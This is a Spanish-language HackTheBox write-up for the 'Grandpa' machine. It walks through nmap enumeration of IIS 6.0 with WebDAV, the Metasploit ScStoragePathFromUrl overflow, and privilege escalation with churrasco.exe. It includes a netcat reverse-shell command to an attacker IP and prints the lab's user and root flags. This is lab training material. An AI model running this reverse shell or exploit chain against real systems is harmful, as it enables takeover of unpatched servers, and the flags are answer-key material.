---
title: "HTB: Grandpa"
date: 2026-10-18 00:00:00 +0200
categories: [HackTheBox, Windows]
tags: [htb, windows, easy, iis, webdav, buffer-overflow, churrasco, privilege-escalation]
author: Ph4n3s
---

## Ficha de la máquina

| Campo       | Valor                  |
|-------------|-------------------------|
| Nombre      | Grandpa                 |
| SO          | Windows                 |
| Dificultad  | Easy                    |
| IP          | 10.129.95.233            |

## 1. Enumeración

Lo primero es lanzar un ping a la máquina para hacernos una idea del sistema operativo. El TTL devuelto es 127, que al aproximarse a 128 nos indica que se trata de una máquina Windows.

```
64 bytes from 10.129.95.233: icmp_seq=1 ttl=127 time=58.0 ms
```

### 1.1 Puertos

Escaneo todos los puertos para ver cuáles están abiertos:

```
nmap -p- -open -T4 --min-rate 5000 10.129.95.233 -oN ~/HTB_machines/Grandpa/ports
```

Resultado:

```
PORT   STATE SERVICE
80/tcp open  http
```

Solo tenemos el puerto 80 abierto. Afino el escaneo sobre ese puerto para identificar la tecnología y versión del servicio:

```
nmap -p 80 -sVC -T4 --min-rate 5000 10.129.95.233 -oN ~/HTB_machines/Grandpa/targeted
```

Resultado:

```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sun, 18 Oct 2026 11:14:24 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Con esto podemos ver que el servidor web es un **Microsoft-IIS/6.0**, versión antigua asociada a Windows Server 2003, conocida por ser vulnerable a Buffer Overflow. También vemos que corre **WebDAV**, que permite gestionar el servidor remotamente sin estar físicamente delante de él. Los **Allowed Methods** expuestos son el punto más interesante, ya que nos permiten realizar determinadas acciones que pueden ser explotadas sobre el servicio.

### 1.2 Búsqueda de exploits

Al tratarse de un servidor antiguo de 2003, los puntos clave a tener en cuenta son WebDAV, el Buffer Overflow y la versión de Microsoft IIS/6.0. Buscando en `msfconsole` por un exploit relacionado, encuentro el siguiente, que es el que voy a utilizar:

```
exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```

## 2. Explotación

Primero intento lanzar el exploit desde mi propia máquina, pero al tratarse de un sistema antiguo y poco optimizado, me da errores al intentar migrar a un proceso con más privilegios dentro de meterpreter. Por ello, decido utilizar la Pwnbox.

En el payload configuro `RHOSTS` con la IP de la máquina (10.129.95.233) y ejecuto `run`. Tras ello se abre la sesión de meterpreter.

Con `ps` reviso los procesos en busca de uno con privilegios de usuario, ya que más adelante necesitaré escalar privilegios, y migro al proceso **1936** para poder continuar con el exploit de escalada.

Para la escalada de privilegios necesito el binario **churrasco.exe**, disponible en el repositorio de GitHub de [Re4son/Churrasco](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe). Lo subiré junto a un **nc.exe** para poder abrir una reverse shell con privilegios desde el meterpreter.

Desde la sesión abierta migro al proceso **2378**, que es el que tiene permisos para subir archivos, y ejecuto:

```
upload /home/ph4n3s/churrasco.exe C:\\Windows\\Temp\\churrasco.exe
upload /usr/share/windows-resources/binaries/nc.exe C:\\Windows\\Temp\\nc.exe
```

Con esto subo ambos binarios a `C:\Windows\Temp`: uno para la escalada de privilegios y otro para la reverse shell.

Tras la subida, abro una `shell`, navego hasta `C:\Windows\Temp` y, mientras en mi equipo atacante dejo un listener escuchando con:

```
nc -nvlp 5555
```

Ejecuto lo siguiente para obtener una reverse shell con privilegios elevados:

```
churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.39 5555"
```

Con esto recibo la conexión en el listener.

## 3. Post-explotación

Navego hasta `C:\Documents and Settings\Harry\Desktop` y hago `type` sobre `user.txt` para obtener la flag de usuario:

```
bdff5ec67c3cff017f2bedc146a5d869
```

Repito el proceso navegando a `C:\Documents and Settings\Administrator\Desktop` y hago `type` sobre `root.txt` para obtener la flag de administrador:

```
9359e905a2c35f861f6a57cecf28bb7b
```

---

¡GRACIAS por leer mi write-up! 🎉
